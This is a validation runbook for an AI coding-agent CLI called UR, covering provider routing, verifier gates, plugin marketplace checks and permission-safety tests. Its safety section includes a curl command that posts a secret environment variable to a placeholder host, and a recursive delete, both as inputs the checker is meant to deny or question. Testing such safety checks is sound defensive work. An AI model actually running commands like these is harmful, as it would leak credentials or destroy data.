# Live Validation Runbook

Use this checklist after installing or upgrading to verify the verifier
subsystem (L1/L2/L3) and the in-repo marketplace work against a real Ollama
session. Should take ~10 minutes.

You need:

- A running Ollama server (`ollama serve`) with at least one model available
  in the local Ollama app. Local models and Ollama Cloud-backed models both
  work because UR talks to the configured Ollama host.
- A second Ollama server on the LAN if you want to test network discovery.
- UR installed globally (`npm install -g ur-agent`) or this repo installed
  globally (`bun add -g github:Maitham16/UR`) or a
  local checkout (`bun run dev`). Bun is required at runtime for every path —
  the npm launcher detects and execs Bun automatically; UR is not Node-native.

## 0. Smoke

```sh
ur --version
# expected for this release: "1.85.2 (UR-Nexus)"
```

### 0.0 Redteam mode and Reverse Skills (1.81.0)

```sh
bun test test/redteamMode.test.ts test/marketplaceTree.test.ts test/settingsDocCoverage.test.ts
node ./bin/ur.js plugin validate plugins/core/reverse-skills
```

The tests verify session-dynamic UR policy, the mandatory warning contract,
topic classification only changing in redteam, current-session scope approval,
active-tool target enforcement, `.ur/security/` persistence, marketplace
integrity, settings documentation, and the plugin's `requiredMode` manifest.

Manual interactive check:

```text
/mode redteam
/mode redteam --accept-risk
/mode
/mode redteam off
```

The first command must warn without activating; acknowledgement activates only
the current session; status must show `redteam (session only)`; leaving the mode
must restore the default UR policy.

### 0.1 Read-only research delegation starts cleanly (1.80.10)

Start an interactive session with task enforcement enabled and ask UR to
research a change, both normally and from Plan Mode. Before any task exists,
built-in `Explore` and `Plan` agent calls should initialize without
`TaskListRequired`. Their workers remain read-only even when the parent uses
Accept Edits or Approve All. Custom agents and ordinary general-purpose agents
should remain blocked until they have an actionable parent task.

The installed public bundle must list both core definitions in its active
built-in registry; a correct research classifier without those definitions is
not a passing state. Development and release builds must both enable
`BUILTIN_EXPLORE_PLAN_AGENTS`.

Repeat with multiple available model families. A model may correctly emit
`subagent_type: "Explore"`; if it instead emits `general-purpose` with an
explicit read-only brief or a pure research/report-only brief, UR must safely
reduce it to Explore and start without a failed `TaskListRequired` attempt. A
brief that also requests implementation, tests, command execution, or file
changes must remain blocked. The deterministic regressions are:

```sh
bun test test/taskListGate.test.ts test/toolExecutionFinalInput.test.ts
```

### 0.0.0 OpenRouter research routing and provider UI (routing updated 1.84.4)

Connect OpenRouter, run `/model`, select OpenRouter, and verify that its model
step shows catalog freshness plus pricing/context/tool/reasoning details. Focus
a reasoning model and press Left/Right; the displayed effort must change and
the row must list only capability-backed selectors that map to that model's native levels. Move Up/Down
between models that top out at high, xhigh, max, and native-ultra models; the level list and
selected ceiling must update immediately. Models that top out at high must omit Ultra, while
xhigh/max entries must show `ultra→xhigh` or `ultra→max`, and the
confirmation must match `/effort status` and the request wire value. For
an Ollama model that advertises thinking without a model-specific ladder, verify that
Left selects off, Right selects on, `t` toggles, and `/effort max` reports that
max was not sent while enabling `think: true`; `/thinking off` must produce
`think: false`. For
llama.cpp, verify focus requests `/props?model=<focused-id>` and that both an
unsupported template and a bare `supports_reasoning_effort: true` flag have no
graded selector unless exact levels are also returned. For vLLM, verify one
focus request to `/server_info?config_format=json`; a non-empty reasoning parser
must expose `minimal→none`, `low`, `medium`, and `high`, serialize
`minimal` as `reasoning_effort: "none"`, and omit Ultra. Open the OpenAI API or
Claude API connection flow and verify the masked `API key` label and entry
remain on one horizontal row.

Then ask UR to research a current topic with WebSearch and WebFetch. Expected:
the auxiliary request stays on the active OpenRouter model, no `modelH` error
appears, a real provider search count is shown, and a response that did not
perform a search fails clearly instead of saying `Did 0 searches`.

Inspect the OpenRouter request body. A turn containing tools must not contain a
default `provider.sort`, leaving Auto Exacto active; a text-only request must
contain `provider.sort="throughput"`. Both retain the stable `session_id`.
Then verify explicit controls and native virtual variants:

```sh
ur config set openrouter.routing latency
ur config set openrouter.allow_fallbacks true
ur config set openrouter.require_parameters true
ur config set openrouter.preferred_min_throughput 40
ur config set openrouter.preferred_max_latency 3
ur config set openrouter.service_tier priority
ur config set openrouter.speed fast
ur config set model <discovered-openrouter-model>:nitro
```

The forced routing value must appear on both tool and non-tool requests;
fallback/threshold settings must use OpenRouter's snake-case wire keys;
`priority`/`fast` must appear only when explicitly selected. `:nitro` must
validate against the discovered base model and inherit its context, output,
tool, and reasoning metadata.

For direct Anthropic, inspect one streaming request with tools. Valid
`cache_control` markers must remain while URHQ-only `scope` is absent, each user
tool must include `eager_input_streaming: true`, and no legacy fine-grained
streaming beta header is required. Then run:

```sh
ur config set anthropic.speed fast
```

Opus 5/4.8 must receive `speed="fast"` and
`anthropic-beta: fast-mode-2026-02-01`; Sonnet, Fable, Haiku, and unsupported
Opus versions must receive neither. A non-stream response must retain
`usage.speed`.

With an identity-linked test key, first omit the workspace. Discovery and
doctor must preserve Anthropic's `anthropic-workspace-id is required` detail
and show the `anthropic.workspace_id` fix. Then configure a `wrkspc_...` value
and verify the same header on model pagination, streaming/non-streaming
Messages, and token counting. A workspace-scoped key must remain valid with no
workspace setting.

For OpenAI retry classification, mock a 429 `billing_not_active` streaming body
and verify exactly one transport call plus the provider's actionable message.
A 429 `rate_limit_exceeded` fixture must remain retryable. The deterministic
coverage is in `test/providerReliability.test.ts`.

Deterministic coverage:

```sh
bun test test/providerPickerPresentation.test.ts \
  test/openRouterEffort.test.ts test/providerModelDiscovery.test.ts \
  test/secondaryModelFallback.test.ts test/providerToolCalls.test.ts \
  test/providerContextWindow.test.ts test/outputLimitRecovery.test.ts \
  test/usageAccounting.test.ts test/providerRouting.test.ts \
  test/reusedToolUseIds.test.ts
```

The repeated-ID fixture contains two sequential completed calls that both
arrive as `TaskCreate:0`. Both call/results must survive the provider-bound
history pass with the later pair renamed deterministically; same-message or
unmatched duplicates must remain visible to corruption repair.

### 0.0.0a Provider output-boundary continuation (1.84.4)

Use a provider fixture that returns `max_tokens`/`length` after non-empty
partial output. UR must withhold the intermediate API error, add a continuation
turn that requests only novel work from the exact cutoff, and continue for more
than three responses while every response progresses. The original prompt,
tool state, and completed output remain in context. Two consecutive empty or
exact-replay capped responses must stop with the stalled-loop diagnostic.

The per-request `max_tokens` value remains bounded by live/static model
metadata. A model with a 128K advertised output ceiling uses a practical 32K
default response chunk; `UR_CODE_MAX_OUTPUT_TOKENS` may raise that chunk to
128K, but neither value creates a total task-output ceiling. Local/user-hosted
runtimes use their conservative 4K reservation and the same continuation path.

```sh
bun test test/outputLimitRecovery.test.ts \
  test/providerRequestTuning.test.ts test/providerContextWindow.test.ts
```

### 0.0.1 Unavailable Ollama tools recover (1.80.7)

With an Ollama model, ask for research that mentions WebSearch. If WebSearch is
not in the active profile, UR should reject that call safely and the agent
should continue with available tools or its useful partial result. It must not
end the parent turn with `Ollama response returned unavailable tool`. Native
and text-form, streaming and non-streaming regressions are covered by:

```sh
bun test test/ollamaToolCalls.test.ts test/kimiToolCalls.test.ts \
  test/repeatedFailureGuard.test.ts test/streamingToolExecutor.test.ts
```

### 0.0.2 Plan approval creates visible tasks (1.80.5)

Start an interactive session with task enforcement enabled, ask for a
multi-file change, and let the agent enter plan mode. Expected lifecycle:

1. Updating the displayed plan succeeds without `TaskListRequired`.
2. Approving `ExitPlanMode` creates or preserves visible implementation tasks.
3. A verification task is blocked by the implementation tasks.
4. The first project edit proceeds and task statuses stay visible.

The deterministic regression is:

```sh
bun test test/taskListGate.test.ts test/planModeTaskSync.test.ts
```

## 0.1 First-workspace model selection (1.45.4)

In a new temporary directory, run `ur`. Expected: before the REPL appears, UR
opens the provider-first picker. After selecting a connected provider and one
of its models, `.ur/settings.local.json` contains both `provider.active` and
the selected model. A second `ur` run in the same directory reuses that local
pair without showing the startup picker.

Before making the interactive choice, the equivalent headless command must
exit non-zero without contacting a model:

```sh
ur -p "say hi"
```

Expected: `No model has been selected for this workspace`. Supplying
`--model <model>`, `OLLAMA_MODEL`, or `UR_MODEL` bypasses the gate for that run.

### 0.1.1 Ollama Cloud latency containment (1.45.5)

Run the deterministic regression coverage:

```sh
bun test test/ollamaTimeout.test.ts
```

Expected: the cloud-model timeout, override-precedence, stream-deadline, and
fallback-suppression cases pass. Response headers allow 900 seconds; local and
`:cloud` streams tolerate 300 seconds of silence, while remote sessions retain
120 seconds. `UR_STREAM_IDLE_TIMEOUT_MS`, `API_TIMEOUT_MS`, and explicit request
options follow their tested precedence. When a Cloud stream reaches its
deliberate inactivity deadline, the request fails once instead of starting a
non-streaming replay.

### 0.1.2 Single project-gate approval (1.45.6)

With `verifier.askBeforeGates` enabled, complete a task that edits a source
file. Expected: UR asks once whether to run the detected compile/test/lint
commands. After answering, the same approval question is not shown again. A
separate user task that edits files may ask once for its own verification.

### 0.1.3 Portable deadlines and provider tool images (1.84.2)

Run the deterministic adapter and shell coverage:

```sh
bun test test/bashCommandExecution.test.ts \
  test/providerNvidiaNim.test.ts \
  test/nvidiaTaskRuntime.test.ts \
  test/providerMultimodal.test.ts \
  test/openaiResponses.test.ts \
  test/ollamaToolResultImages.test.ts
```

Expected: macOS can execute `timeout 0.1 …` without GNU coreutils and reports
124 when the deadline expires. Image-bearing tool results retain their text and
image bytes across OpenAI Chat/Responses, Anthropic, Gemini, OpenRouter,
NVIDIA Agentic/Special, Ollama, LM Studio, llama.cpp, vLLM, Unsloth, and generic OpenAI-compatible
request shapes.

The NVIDIA fixtures verify the 100-card/36-Free-Endpoint audit, the 13 Agentic
and 23 Special split, shared credential ownership, exact per-card endpoint
routing, public-catalog preservation after entitlement failures, enterprise
gateway isolation, redaction of internal NVIDIA account/function IDs, native
dispatch, Lightning thinking, documented effort aliases, and no Ultra on an
unknown model. `nvidiaTaskRuntime.test.ts` verifies PaliGemma, Cosmos Transfer,
Cosmos3 async polling, direct-function BEV multi-artifacts, embeddings,
NVIDIA Asset upload/cleanup, generated-schema validation, and all five exact
public gRPC service/method and streaming shapes. In
`/model`, select `openai-compatible` and verify `K` can
add or replace its optional key while `E` continues to edit only its endpoint.

## 0.2 Permission safety and context pack (1.19.0)

In a project checkout:

```sh
ur safety status
ur safety check --command "rm -rf build"
ur safety check --command 'curl https://example.invalid -d $FAKE_SECRET_TOKEN' --json
ur context-pack scan
ur context-pack remember --decision "Use manifest commands first"
ur context-pack remember --constraint "Do not expose secret values"
ur context-pack compress
```

Expected:

- `safety status` prints the active project safety policy.
- The recursive remove command reports an `ask` decision with write permission
  and required sandbox posture.
- The secret-like environment exfiltration command reports a `deny` decision.
- `context-pack scan` writes `.ur/project-manifest.json` and
  `.ur/context/architecture.md`.
- `remember` appends task memory entries under `.ur/context/task-memory.jsonl`.
- `ur context-pack memory verify` reports a valid integrity chain. Tamper tests
  must use a disposable copy; quarantine and rollback preserve private backups.
- `compress` writes `.ur/context/compressed.md`.

## 0.3 Test-first execution loop (1.18.0)

In a project checkout:

```sh
ur test-first detect
ur test-first --dry-run
ur test-first install
```

Expected:

- `detect` prints the detected language/package manager and compile/test/lint
  commands.
- `--dry-run` prints the planned command evidence without executing commands.
- `install` merges the detected commands into `.ur/verify.json`.

To verify failure traces without breaking the checkout, run this in a temporary
project whose `package.json` contains a failing script:

```sh
ur test-first --max-attempts 1
```

Expected: a non-zero command creates a log under
`.ur/test-first/traces/`, and the command reports `exhausted`, not `passed`.

## 0.4 Reliable repo editing (1.17.0)

In a disposable checkout:

```sh
ur repo-edit index
ur repo-edit preview rename oldName --to newName
ur repo-edit apply rename oldName --to newName --check "bun test" --json
```

Expected:

- `index` writes `.ur/repo-edit/index.json`.
- `preview` prints a unified patch and does not write files.
- `apply` changes JavaScript/TypeScript identifier nodes only.
- If the check command exits non-zero, every touched file is restored and the
  JSON result reports `"rolledBack": true`.

## 0.5 Network Ollama discovery (1.16.0)

With at least one other Ollama server reachable on your LAN:

```sh
ur --discover-ollama
```

Expected: a picker appears listing `This computer` plus the LAN host(s). Select
the LAN host, then run a prompt and confirm traffic goes to the selected host.

Without a LAN host, you can still verify host configuration:

```sh
ur --ollama-host http://localhost:11434 -p "say hi"
ur --settings '{"ollama":{"host":"http://localhost:11434"}}' -p "say hi"
```

## 0.6 v1.47 protocol, provenance, and telemetry gates

These deterministic tests use local fixtures, fake transports, and mock
exporters. They do not require a paid provider account or make paid model calls:

```sh
bun test test/acpStdio.test.ts test/a2aV1.test.ts test/mcp2026.test.ts
bun test test/openaiResponses.test.ts test/genAiTelemetry.test.ts
bun test test/agUi.test.ts test/skillCommand.test.ts
bun test test/skillProvenance.test.ts test/taskMemoryIntegrity.test.ts
```

Expected: ACP lifecycle/replay, A2A dual-stack isolation, MCP Tasks/Apps,
Responses HTTP/SSE/WebSocket/background behavior, OpenTelemetry redaction,
AG-UI lifecycle/security, `.agents/skills/` precedence, Ed25519 skill trust,
and task-memory quarantine/rollback all pass. Then run:

```sh
bun run typecheck
bun run lint
bun test
bun run build
bun run secrets:scan
bun run dependencies:audit
bun run release:check
bun run package:check
```

## 0.7 Frontier agent workflow gates

These deterministic suites use temporary repositories, fake managed-cloud
clients, injected runners, and mock desktop drivers. They make no paid model
calls:

```sh
bun test test/cloudDesktopQa.test.ts
bun test test/learnedPlaybooks.test.ts test/memoryCitations.test.ts
bun test test/agenticCi.test.ts test/trajectoryCapture.test.ts
bun test test/sideChats.test.ts test/workspaceCoordinator.test.ts
bun test test/arenaModelJudge.test.ts
```

Expected coverage:

- Managed cloud fan-out selects only completed candidates with explicit
  `PASS` and safe non-empty review branches. Ordering is deterministic and
  never fetches or merges a branch. Cancellation remains terminal even when a
  remote session finishes starting concurrently.
- Cloud, local-background, and owner-scoped A2A steering reject terminal or
  foreign tasks, bound message/receipt storage, and deduplicate request IDs
  before delivery.
- Learned playbooks require proof-backed safe evidence and explicit approval.
  Rejection is terminal; disable verifies the promoted workflow, moves it to
  the private disabled archive, and prevents execution.
- Cited memory revalidates file excerpts and run artifacts by digest, excludes
  stale/missing entries by default, and leaves user/web sources explicitly
  unverifiable without reopening them.
- Agentic CI treats event text as data, uses a read-only pinned workflow,
  isolates credentials, checks deletion/rename-source and path policy using
  exact NUL-delimited Git metadata, and emits only a bounded hash-addressed
  patch plus its manifest. A passing verification command that changes staged,
  unstaged, untracked, or index-visible state must block and emit no patch.
- Trajectory capture retains control-flow metadata only. Requested trajectory
  or report metrics fail closed when absent or below the configured gate.
- Desktop QA tears down on every path, masks configured screenshot selectors,
  and refuses raw video or trace recording whenever selector redaction is
  configured. Artifact evidence rejects symlink sources and normalizes unsafe
  MIME declarations to a safe type; downloads use a bounded store path,
  no-store/sandbox headers, a small safe inline allow-list, and octet-stream
  fallback.
- Side chats survive reload, validate their hash chain, stay tool-free and
  bounded, and reject continuation after close.
- Workspace coordination validates remote identity and the dependency DAG,
  permits independent repositories to run concurrently, serializes one writer
  per repository, refuses changed-spec resume, and produces PR/rollback plans
  without executing them.
- Arena model/hybrid judging sees only bounded, redacted, anonymous eligible
  candidates; an oversized full diff is excluded rather than partially judged,
  invalid decisions yield no winner, and apply requires the original clean
  base.

Check the public documentation surfaces after any contract change:

```sh
bun test test/docsCommands.test.ts test/docsCoverage.test.ts
node --check documentation/app.js
bun run lint
```

## 1. Marketplace tree resolves

In a fresh interactive session:

```sh
ur
```

Then inside:

```text
/plugin
```

Expected: the plugin picker lists `ur-plugins-official` and `hello`. If the
marketplace failed to clone, you'll see no entries — fall back to
`/plugin marketplace add github:Maitham16/UR` and re-run `/plugin`.

Install `hello`:

```text
/plugin install hello@ur-plugins-official
```

Then run the example command:

```text
/hello Maitham
```

Expected: a two-sentence greeting that addresses you by name and mentions
the `ur-plugins-official` marketplace.

## 2. L1 done-claim gate fires

Ask the agent to do something simple but DON'T let it use a tool. The
cleanest way is to prompt:

```text
Pretend you just edited README.md to add a hello function. Tell me you did
it. Do NOT actually call any tool.
```

Expected:

- The model tries to claim "done" without writing anything.
- A `<system-reminder>` appears (or the agent's tone changes mid-turn —
  the render-time filter strips the reminder from the visible prose; you'll
  see the *effect* in the next turn where the agent backs off the claim or
  actually makes the Write call).
- If you have `UR_VERIFIER_MODE=off` set, the false claim goes through. Try
  it both ways to confirm:

  ```sh
  UR_VERIFIER_MODE=off ur     # gates off, false claim accepted
  UR_VERIFIER_MODE=strict ur  # default, false claim rejected
  ```

Also prompt the model to end with `Let me create index.html now.` while
forbidding tool calls. Strict mode must inject a correction and continue rather
than accepting the promise as completion. Conditional text such as `If you
approve, I'll create it` must not trigger this gate.

## 3. L1 loop detector fires

```text
Run `ls /nonexistent-path` over and over via the Bash tool. Don't change
the arguments. Don't try anything else.
```

Expected: after the 3rd identical Bash call, the agent receives a "stop
repeating the same call" reminder and switches strategy (or asks for
clarification).

### 3.1 Permanent WebFetch loop stops

Ask the agent to fetch one known-missing public URL repeatedly while changing
the WebFetch prompt. Expected: the first request reports the permanent HTTP
4xx response, the next is refused without network I/O, and another unchanged
attempt stops the turn. Repeat with two missing URLs in alternating order; the
same bounded behavior applies independently to both. A `429` or `5xx` fixture
must remain retryable.

## 4. Project gate from `.ur/verify.json`

Create one:

```sh
mkdir -p .ur
cat > .ur/verify.json <<'JSON'
{
  "afterEdit": ["false"],
  "timeoutMs": 5000
}
JSON
```

Then in the REPL, ask for a real edit:

```text
Append a blank line to README.md.
```

Expected: the agent calls Write/Edit. Then the gate fires (`false` always
exits 1) and the agent receives a reminder naming the command and its
non-zero exit. The agent should either fix something and retry or surface
the failure honestly instead of declaring done.

Clean up:

```sh
rm .ur/verify.json
```

## 5. L2 subagent nudge (opt-in)

The deep verification subagent does NOT fire automatically by default — deep
verification is manual (step 6). To exercise the auto-nudge, start UR with it
enabled:

```sh
UR_VERIFIER_AUTO_SUBAGENT=1 ur
```

Then:

```text
Add a short docstring to the top of any one file in src/. After that,
just say "all done" with no further tool calls.
```

Expected after the model "finishes":

- The verifier injects the L2 nudge as a `<system-reminder>`.
- The agent calls `Task` with `subagent_type="verification"`.
- The verifier subagent returns a `VERDICT: PASS / FAIL / PARTIAL` line.
- The main agent echoes the verdict in its final response.

If the model ignores the nudge twice in a row, the loop falls through to
`completed` so you don't hang — that's intentional safety, not a bug.

Without `UR_VERIFIER_AUTO_SUBAGENT`, the same prompt finishes with no nudge —
that's the default. To also unregister the subagent entirely (so `/verify`
can't spawn it either):

```sh
UR_VERIFIER_DISABLE_SUBAGENT=1 ur
```

## 6. `/verify` works manually

```text
/verify the docstring you added
```

Expected: agent spawns the verification subagent and reports the verdict.
Same flow as step 5 but on demand.

## 7. `/trace` works

```text
/trace 12
```

Expected: a numbered list of the last 12 messages with role, uuid prefix,
text previews, `tool_use` signatures, and any `tool_result` bodies. Any
turn that produced a `VERDICT:` line gets a `verdict: PASS/FAIL/PARTIAL`
annotation.

Try `/trace 999` to confirm it caps at 50.

## 8. System-reminder filter

If you've already triggered steps 2-5, look at the visible assistant prose
for any literal `<system-reminder>` text. There should be none. The filter
strips them at render time as defense in depth even if the model echoes a
reminder back.

## 9. Direct agent-platform commands parse feature flags

These commands should parse their own flags directly, without requiring a `--`
separator after the command name:

```sh
ur spec init validation-demo --goal "1. add a helper 2. add a test"
ur spec run validation-demo --all --dry-run
ur arena "implement a debounce helper" --agents 2 --dry-run
ur escalate run "refactor the cache layer" --force-oracle --dry-run
ur test-first --dry-run
ur safety check --command "rm -rf build"
ur context-pack scan
ur ci-loop --command "bun test" --cwd . --dry-run
ur artifacts capture-tests --command "bun test"
```

Expected: no `unknown option` or `too many arguments` parser errors.
The CI-loop result should include the resolved working directory. If that
directory has no matching tests, the run should stop after its first attempt
with `--cwd` guidance and must not launch a fix agent.

## What to do if any step fails

- Step 1 (marketplace): check `ls ~/.ur/marketplaces/` — `ur-plugins-official`
  should be there. If absent, `gh repo clone Maitham16/UR` manually
  into `~/.ur/marketplaces/ur-plugins-official` as a fallback.
- Steps 2-5 (verifier): set `UR_VERIFIER_MODE=off` and re-run to confirm
  the issue is the verifier path, not the rest of the loop. Then file an
  issue with the exact prompt + the model name (`ollama list`).
- Step 6/7 (slash commands): `/help` should show them. If not, they failed
  to register — file an issue with the version (`ur --version`).
- Step 8 (filter): if `<system-reminder>` appears in visible prose, copy
  the literal output and file an issue.
- Step 9 (direct commands): run `ur --help` and confirm `spec`, `arena`,
  `escalate`, `test-first`, `safety`, `context-pack`, `ci-loop`, and `artifacts` appear. If `unknown option` or
  `too many arguments` appears, reinstall `ur-agent@latest` and verify the
  npm version with `npm view ur-agent version`.
